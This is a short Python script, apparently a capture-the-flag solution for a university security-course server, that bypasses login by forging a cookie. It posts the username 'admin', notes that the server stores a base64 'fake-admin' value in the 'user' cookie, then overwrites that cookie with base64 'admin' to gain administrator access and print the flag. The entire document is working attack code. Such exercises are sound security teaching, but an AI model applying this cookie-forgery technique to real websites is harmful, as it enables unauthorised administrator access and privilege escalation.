import requests
import re

SERVER = 'http://mustard.stt.rnl.tecnico.ulisboa.pt:22056'

# Start session
session = requests.session()

data = {"username": 'admin'}

# username will change to a 'fake-admin'
r = session.post(SERVER, data=data)
#print(session.cookies.get_dict()) --> ZmFrZS1hZG1pbg== (coded in b64)

# it will force the cookie field 'user' to be the true admin (YWRtaW4= in b64)
session.cookies.set('user', 'YWRtaW4=', domain="mustard.stt.rnl.tecnico.ulisboa.pt", path='/')
r = session.get(SERVER) # refresh

print("The flag is: " + r.text)
